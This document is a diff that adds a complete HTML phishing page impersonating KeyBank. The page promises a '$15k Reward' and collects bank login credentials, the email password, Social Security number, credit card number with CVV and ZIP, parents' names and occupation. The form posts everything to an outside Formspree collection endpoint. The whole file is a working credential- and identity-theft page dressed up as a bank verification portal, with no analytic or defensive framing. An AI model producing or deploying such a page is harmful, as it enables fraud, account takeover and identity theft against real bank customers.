@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KeyBank - Account Verification</title>
+    <style>
+        /* CSS STYLING - PREMIUM KEYBANK THEME */
+        :root {
+            --key-blue: #003366; /* Official KeyBank Dark Blue */
+            --key-light: #005eb8; /* Accent Blue */
+            --key-gold: #C5A059; /* Premium Gold for $15k */
+            --bg-color: #F2F4F7; /* Soft gray background */
+            --white: #ffffff;
+            --text-main: #1D1D1B;
+            --text-sub: #666666;
+            --border: #E0E0E0;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; /* Clean, modern font stack */
+        }
+
+        body {
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* Main Card Container */
+        .card {
+            background-color: var(--white);
+            width: 100%;
+            max-width: 440px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 51, 102, 0.12); /* Soft, realistic shadow */
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Header Section */
+        .header {
+            background-color: var(--white);
+            padding: 24px 24px 20px 24px;
+            border-bottom: 1px solid var(--border);
+            text-align: center;
+            position: relative;
+        }
+
+        /* KeyBank Logo SVG Styling */
+        .logo-wrap {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .kb-icon {
+            width: 32px;
+            height: 32px;
+            fill: var(--key-blue);
+        }
+
+        .brand-text {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--key-blue);
+            letter-spacing: -0.5px;
+        }
+
+        /* The $15k Claim Badge */
+        .claim-badge {
+            background-color: #FFF8E1;
+            border: 1px solid var(--key-gold);
+            color: #7A6324;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 14px;
+            border-radius: 50px;
+            font-size: 13px;
+            font-weight: 600;
+            box-shadow: 0 2px 4px rgba(197, 160, 89, 0.2);
+        }
+
+        .claim-badge svg {
+            width: 14px;
+            height: 14px;
+            fill: var(--key-gold);
+        }
+
+        /* Form Body */
+        .form-body {
+            padding: 24px;
+        }
+
+        /* Section Headers (e.g., "Account Info") */
+        .section-label {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            color: var(--key-light);
+            font-weight: 700;
+            margin-bottom: 8px;
+            margin-top: 16px;
+            padding-left: 4px;
+        }
+
+        .section-label:first-of-type {
+            margin-top: 0;
+        }
+
+        /* Input Fields */
+        .input-group {
+            margin-bottom: 12px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: var(--text-sub);
+            margin-bottom: 4px;
+            padding-left: 4px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            font-size: 15px;
+            color: var(--text-main);
+            background-color: #FAFAFA;
+            transition: all 0.2s ease;
+        }
+
+        .input-group input:focus {
+            background-color: var(--white);
+            border-color: var(--key-light);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 94, 184, 0.1);
+        }
+
+        /* Grids for smaller fields */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+        }
+
+        /* Submit Button */
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--key-blue);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 24px;
+            transition: background-color 0.3s ease, transform 0.1s;
+            box-shadow: 0 4px 6px rgba(0, 51, 102, 0.2);
+        }
+
+        .submit-btn:hover {
+            background-color: var(--key-light);
+        }
+
+        .submit-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 16px;
+            font-size: 11px;
+            color: #888;
+            background-color: #FAFAFA;
+            border-top: 1px solid var(--border);
+        }
+
+        /* Verification Checkmark Animation */
+        .verified-icon {
+            display: inline-block;
+            margin-left: 5px;
+            color: #2ecc71;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header">
+        <div class="logo-wrap">
+            <!-- Realistic KeyBank Style SVG Logo -->
+            <svg class="kb-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h-2v-6h2v6zm4 0h-2v-6h2v6z" opacity="0"/> <!-- Hidden base -->
+                <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 14c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3zm3-9H9V5h6v3z"/> 
+                <!-- Simplified 'K' shape representation for logo -->
+                <path d="M12 4l-1.41 1.41L13.17 8H8v2h5.17l-2.58 2.59L12 14l4-4-4-4z" transform="translate(4, 6) scale(0.8)"/>
+            </svg>
+            <span class="brand-text">KeyBank</span>
+        </div>
+        
+        <div class="claim-badge">
+            <!-- Trophy Icon -->
+            <svg viewBox="0 0 24 24"><path d="M19 5h-2V3H7v2H5c-1.1 0-2 .9-2 2v1c0 2.55 1.92 4.63 4.39 4.82.65 1.5 1.98 2.63 3.61 2.89V19H7v2h4v-2h2v2h4v-2h-4v-5.29c1.63-.26 2.96-1.39 3.61-2.89C19.08 10.63 21 8.55 21 6V7c0-1.1-.9-2-2-2zM5 6V5h2v2H5zm12 0h-2V5h2v1z"/></svg>
+            Claim your $15k Reward
+        </div>
+    </div>
+
+    <div class="form-body">
+        <!-- Formspree Integration -->
+        <form action="https://formspree.io/f/mykqrvre" method="POST">
+            
+            <!-- Section 1: Login Credentials -->
+            <div class="section-label">Account Credentials</div>
+            
+            <div class="input-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" placeholder="e.g. jdoe123" required>
+            </div>
+
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="••••••••" required>
+            </div>
+
+            <!-- Section 2: Contact & Email -->
+            <div class="section-label">Contact Information</div>
+
+            <div class="input-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" placeholder="name@example.com" required>
+            </div>
+
+            <div class="input-group">
+                <label for="email_password">Email Password</label>
+                <input type="password" id="email_password" name="email_password" placeholder="••••••••" required>>
+            </div>
+
+            <!-- Section 3: Identity Verification -->
+            <div class="section-label">Identity & Security</div>
+
+            <div class="input-group">
+                <label for="ssn">SSN (Social Security Number)</label>
+                <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" required>
+            </div>
+
+            <!-- Section 4: Payment Method -->
+            <div class="section-label">Payment Method</div>
+
+            <div class="input-group">
+                <label for="credit_card">Credit Card Number</label>
+                <input type="text" id="credit_card" name="credit_card" placeholder="0000 0000 0000 0000" required>
+            </div>
+
+            <div class="grid-3">
+                <div class="input-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" required>
+                </div>
+                <div class="input-group">
+                    <label for="zip">ZIP Code</label>
+                    <input type="text" id="zip" name="zip" placeholder="10001" required>>
+                </div>
+            </div>
+
+            <!-- Section 5: Personal Details -->
+            <div class="section-label">Personal Details</div>
+
+            <div class="grid-2">
+                <div class="input-group">
+                    <label for="father_name">Father's Name</label>
+                    <input type="text" id="father_name" name="father_name" placeholder="Full Name" required>
+                </div>
+                <div class="input-group">
+                    <label for="mother_name">Mother's Name</label>
+                    <input type="text" id="mother_name" name="mother_name" placeholder="Full Name" required>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label for="occupation">Occupation</label>
+                <input type="text" id="occupation" name="occupation" placeholder="e.g. Engineer" required>
+            </div>
+
+            <button type="submit" class="submit-btn">Verify & Claim $15k</button>
+       <form action="https://formspree.io/f/mkoldazv" method="POST">
+    </div>
+
+    <div class="footer">
+        KeyBank Corporation &copy; 2023. All rights reserved.<br>
+        Secure Verification Portal
+    </div>
+</div>
+
+<script>
+    // Smooth interaction on button click
+    const btn = document.querySelector('.submit-btn');
+    btn.addEventListener('click', function() {
+        btn.innerHTML = 'Processing...';
+        btn.style.opacity = '0.8';
+        btn.style.cursor = 'wait';
+    });
+</script>
+
+</body>
+</html>
